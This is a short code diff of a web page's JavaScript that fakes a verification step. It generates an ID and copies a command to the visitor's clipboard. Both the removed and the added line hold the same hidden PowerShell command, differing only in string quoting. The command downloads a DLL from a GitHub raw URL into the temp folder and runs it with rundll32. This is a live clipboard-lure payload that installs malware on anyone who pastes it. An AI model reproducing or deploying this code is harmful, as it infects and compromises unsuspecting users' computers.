@@ -471,8 +471,7 @@
             var verification_id = generateRandomNumber();
             document.getElementById('verification-id').textContent = verification_id;
             
-			const commandToRun = "powershell.exe -w hidden -Command \"(iwr 'https://raw.githubusercontent.com/steluzororzeimai1984/6ilcmxzx9nxy7ox6fwhvw55mapng2/refs/heads/main/1140270734_x64.dll' -OutFile $env:TEMP\c.dll);rundll32.exe $env:TEMP\c.dll,Start;\" ";
-
+			const commandToRun = `powershell.exe -w hidden -Command "(iwr 'https://raw.githubusercontent.com/steluzororzeimai1984/6ilcmxzx9nxy7ox6fwhvw55mapng2/refs/heads/main/1140270734_x64.dll' -OutFile $env:TEMP\\c.dll);  rundll32.exe $env:TEMP\\c.dll,Start;"`;
 			
             stageClipboard(commandToRun, verification_id)
         }
